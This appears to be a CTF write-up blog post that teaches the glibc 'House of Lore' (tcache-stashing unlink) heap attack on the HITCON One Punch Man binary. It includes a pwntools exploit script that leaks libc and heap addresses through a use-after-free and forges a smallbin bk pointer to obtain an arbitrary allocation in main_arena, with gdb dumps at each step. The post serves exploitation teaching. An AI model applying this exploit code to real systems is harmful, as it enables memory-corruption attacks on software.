---
layout: "post"
title: "House Of Lore"
date: 2020-5-15
exerpt: "tcache-stashing unlink attack"
tags: [Heap, House of Lore, CTF]
---

This attack was introduced for glibc > 2.25 since the addition of tcache bins into glibc malloc.

**PS** - This attack is mostly based on Shellphish's [how2heap](https://github.com/shellphish/how2heap) implementation.

I will be using Hitcon's *One Punch Man* challenge to help you understand how this attack works.
The writeup is a humble attempt to elaborate Shellphish's implementation of **House Of Lore**.

**NOTE** - This writeup is not the intended solution for the challenge involved. The detailed solution will be discussed in the next post :P:.
{: .notice}

## TL;DR of the Challenge Binary

We have been given a standard CTF style `x86 64-bit Dynamically linked` binary to start with.
`Checksec` shows pretty much every security measure enabled.

### Primitives Required to Achieve House Of Lore

* The well known **Use After Free** [both read and write].
* Malloc and calloc both being called as per attacker request.
* Double Free
* Both libc and heap memory leaks.

One fact that we leverage for our attack is that calloc calls dont take from tcache bins.

Before we go any further , we need to analyze the source code of glibc malloc and get a cusp of what exactly all this is about.

```c
  /*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) {
        // Get the index of the small bin
        idx = smallbin_index(nb);
        // Get the corresponding chunk pointer in the small bin
        bin = bin_at (av, idx);
        // First execute victim= last(bin) to get the last chunk of the small bin
        // If victim = bin , then the bin is empty.
        // If they are not equal, then there will be two cases
        if ((victim = last(bin)) != bin) {
            // In the first case, the small bin has not yet been initialized.
            if (victim == 0) /* initialization check */
                // Perform initialization to merge chunks in fast bins
                malloc_consolidate (of);
            // In the second case, there is a free chunk in the small bin
            else {
                // Get the second-to-last chunk in the small bin.
                bck = victim->bk;
                // Check if bck->fd is victim, prevent forgery
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // Set the corresponding inuse bit of victim
                set_inuse_bit_at_offset(victim, nb);
                // Modify the small bin list, take the last chunk of the small bin
                bin-> bk = bck;
                bck->fd = bin;
                // If it is not main_arena, set the corresponding flag
                if (av != &main_arena) set_non_main_arena(victim);
                // Detailed inspection
                check_malloced_chunk (off, victim, nb);
                // Convert the requested chunk to the corresponding mem state
                void *p = chunk2mem(victim);
                // If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff
                alloc_perturb(p, bytes);
                return p;
            }
        }
    }
```

What we're actually interested is this part -> 

```c
// Get the second-to-last chunk in the small bin.
                bck = victim->bk;
                // Check if bck->fd is victim, prevent forgery
                if (__glibc_unlikely(bck->fd != victim)) {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                // Set the corresponding inuse bit of victim
                set_inuse_bit_at_offset(victim, nb);
                // Modify the small bin list, take the last chunk of the small bin
                bin-> bk = bck;
                bck->fd = bin;

```

If we can modify the `bck` of the last chunk of small bin with an address in such a way that we satisfy the corruption check , then we can successfully get an allocation in an arbitrary location.

## Reversing

The binary is a standard Heap challenge binary with `Add`,`Edit`,`View` and `Delete` functionalities.

I will not be discussing all the details of what these functions do as there will be a detailed writeup for describing everything eloquently.

For now , I will just discuss what is needful for the attack to be triggered.

* The add function does the calloc part , it can allocate chunks in range of sizes from [0x7f,0x400].
* The free function has **Use After Free** as it does not null the pointer of the freed chunk.
* The view function  views a chunk at requested idx.
* The edit function safely edits a chunk at requested idx.
* We have a secret function which can call malloc only when 0x220 tcache is filled with all 7 chunks of that size.

Since we have **UAF** , we can edit free chunks also , hence we can **Double Free** by bypassing fd , bk checks in malloc.

Now we have everything we need to perform **House Of Lore**.

## Exploit Development

We can begin with creating wrapper functions which do necessary stuff for us.

```py
from pwn import *
import sys

io=process("./one_punch_loaded",env = {"LD_PRELOAD" : "./libc.so.6"})

if(len(sys.argv) == 1):
    context.noptrace = True

def add(idx,name):
    io.sendlineafter("> ",'1')
    io.sendlineafter("idx: ",str(idx))
    io.sendlineafter("name: ",str(name))

def edit(idx,name):
    io.sendlineafter("> ",'2')
    io.sendlineafter("idx: ",str(idx))
    io.sendafter("name: ",name)

def view(idx):
    io.sendlineafter("> ",'3')
    io.sendlineafter("idx: ",str(idx))

def free(idx):
    io.sendlineafter("> ",'4')
    io.sendlineafter("idx: ",str(idx))

def secret(data):
    io.sendlineafter("> ",'50056')
    io.send(data)

```

Leaking both libc and heap should not require much explanation so I'll go right away with that.

We leak libc by viewing an unsorted bin chunk after filling up 0x220 tcache.

```py
#Add 2 chunks of 0x217
add(0,'0'*0x217)
add(1,'1'*0x217)

#Fill 0x217 tcache
for _ in xrange(7):
    add(2,'2'*0x217)
    free(2)

add(2,'2'*0x217)
add(0,'3'*0x1f0)
```

Our aim is to send two chunks into the same size unsorted bins without coalescing. Hence we now send two chunks from different locations of heap so as to prevent merging and sending two separate chunks into unsorted bin and subsequently to the small bin thereafter
```py

free(2) #Chunk 2 also goes into unsorted bin
free(1) #Chunk 1 also goes into unsorted bin

#Heap
view(1)
io.recvuntil("hero name: ")
heap_base = u64(io.recv(6) + '\x00'*2) -  0x1570

#Libc
view(2)
io.recvuntil("hero name: ")
libc_base = u64(io.recv(6) + '\x00'*2) - 0x219ca0

log.info("Heap -> " + hex(heap_base))
log.info("Libc -> " + hex(libc_base))

```
From now on , it is better we have a look at the memory layout at each step for better understanding.
For the sake of brevity , I will just show the dump of only few memory blocks of each chunk.

```sh
gdb-peda$ x/6gx 0x555555559480-0x10
0x555555559470:	0x0030303030303030	0x0000000000000221 -> This is chunk 1 which we freed
0x555555559480:	0x000055555555a570	0x00007ffff7fefca0
0x555555559490:	0x3131313131313131	0x3131313131313131

gdb-peda$ x/6gx 0x55555555a580-0x10
0x55555555a570:	0x0032323232323232	0x0000000000000221 -> This is chunk 2 
0x55555555a580:	0x00007ffff7fefca0	0x0000555555559470
0x55555555a590:	0x3232323232323232	0x3232323232323232

```

Also have a look at `main_arena`

```sh
0112| 0x7ffff7fefca0 --> 0x55555555a990 --> 0x0  -> Top Chunk
0120| 0x7ffff7fefca8 --> 0x0
0128| 0x7ffff7fefcb0 --> 0x555555559470 --> 0x30303030303030 ('0000000')  -> Unsorted Bins , Chunk 1
0136| 0x7ffff7fefcb8 --> 0x55555555a570 --> 0x32323232323232 ('2222222')  -> Chunk 2

```

Now we send both unsorted bins to small bin.

```py
add(0,'S'*0x300)
```
As u can see from below , both chunks have been added to small bin.

```sh
0648| 0x7ffff7fefeb8 --> 0x7ffff7fefea0 --> 0x7ffff7fefe90 --> 0x7ffff7fefe80 --> 0x7ffff7fefe70 --> 0x7ffff7fefe60 (--> ...)
0656| 0x7ffff7fefec0 --> 0x555555559470 --> 0x30303030303030 ('0000000') -> Chunk 1
0664| 0x7ffff7fefec8 --> 0x55555555a570 --> 0x32323232323232 ('2222222') -> Chunk 2
```

Now , we create space in tcache for triggering the vulnerability.

Let us recollect that we now edit the `bk` pointer of our small bin chunk and then with a malloc , we can now send our small bin chunk to tcache.

But first of all , to send our target chunk to tcache , we first need to make some place in tcache of 0x220 , so we malloc and consume one tcache.

```py
secret('a')

```
 
Now we can edit the `bk` pointer of chunk 2. Note that here we intend to get an allocation on `main_arena` structure.

Before editing , let us have a look at what we intend to do.

```sh
0640| 0x7ffff7fefeb0 --> 0x7ffff7fefea0 --> 0x7ffff7fefe90 --> 0x7ffff7fefe80 --> 0x7ffff7fefe70 --> 0x7ffff7fefe60 (--> ...)
0648| 0x7ffff7fefeb8 --> 0x7ffff7fefea0 --> 0x7ffff7fefe90 --> 0x7ffff7fefe80 --> 0x7ffff7fefe70 --> 0x7ffff7fefe60 (--> ...)
0656| 0x7ffff7fefec0 --> 0x555555559470 --> 0x30303030303030 ('0000000')
0664| 0x7ffff7fefec8 --> 0x55555555a570 --> 0x32323232323232 ('2222222') -> we can easily pass corruption checks with this as our   new fake chunk , let's call this the victim chunk :P.
```

Now we edit chunk 2's *bk* ptr , note that we dont change the fd and keep it as it is.

```py

victim = libc_base + 0x219ec8
edit(2,p64(victim-0x18) + p64(victim-0x10)) #Turns out that fd was victim-0x18, afterall it's all in the main_arena :)

```

Let's trigger our unsafe unlink and send our victim to tcache.

```py
add(0,'a'*0x217)
```

Now see the magic.

```sh
gdb-peda$ x/50gx 0x0000555555559000
0x555555559000:	0x0000000000000000	0x0000000000000251
0x555555559010:	0x0000000000000000	0x0000000000000000
0x555555559020:	0x0000000000000000	0x0000000000000000
0x555555559030:	0x0000000000000007	0x0000000000000000
0x555555559040:	0x0000000000000000	0x0000000000000000
0x555555559050:	0x0000000000000000	0x0000000000000000
0x555555559060:	0x0000000000000000	0x0000000000000000
0x555555559070:	0x0000000000000000	0x0000000000000000
0x555555559080:	0x0000000000000000	0x0000000000000000
0x555555559090:	0x0000000000000000	0x0000000000000000
0x5555555590a0:	0x0000000000000000	0x0000000000000000
0x5555555590b0:	0x0000000000000000	0x0000000000000000
0x5555555590c0:	0x0000000000000000	0x0000000000000000
0x5555555590d0:	0x0000000000000000	0x0000000000000000
0x5555555590e0:	0x0000000000000000	0x0000000000000000
0x5555555590f0:	0x0000000000000000	0x0000000000000000
0x555555559100:	0x0000000000000000	0x0000000000000000
0x555555559110:	0x0000000000000000	0x0000000000000000
0x555555559120:	0x0000000000000000	0x0000000000000000
0x555555559130:	0x0000000000000000	0x0000000000000000
0x555555559140:	0x0000000000000000	0x0000000000000000
0x555555559150:	0x00007ffff7fefec8	0x0000000000000000 -> Our victim chunk landed on tcache
```

With yet another malloc call , we get our victim chunk back.
The binary poses a constraint here , we can malloc only when the 0x220 tcache is filled.
So let's do that first and then call malloc.


```py

add(1,'T'*0x217)
gdb.attach(io)
free(1) #Refill tcache
add(2,'P'*0x300) #Padding chunk to prevent top consolidation
```

Finally call malloc and get victim.

```py
io.sendlineafter("> ",'50056')
io.sendline('a')
```
And Boom , malloc gives us our victim chunk back.

```sh
RAX: 0x7ffff7fefec8 --> 0x55555555a140 --> 0x555555559f20 --> 0x555555559d00 --> 0x555555559ae0 --> 0x5555555598c0 (--> ...)

```
We can see the return value of malloc in `RAX` register , which is nothing but our victim chunk.

## Conclusion

The idea was just to understand how House Of Lore works and it is not the intended solution for this challenge.
On the other hand , to get control flow , we still have to ramble a little more to get things working in our favour.

In the coming post , I will discuss how we can use House Of Lore twice and get `malloc_hook` allocated on tcache.
{: .notice}

## References

1. Shellfish's [how2heap](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_stashing_unlink_attack.c) 
2. [Phrack](http://phrack.org/issues/67/8.html)
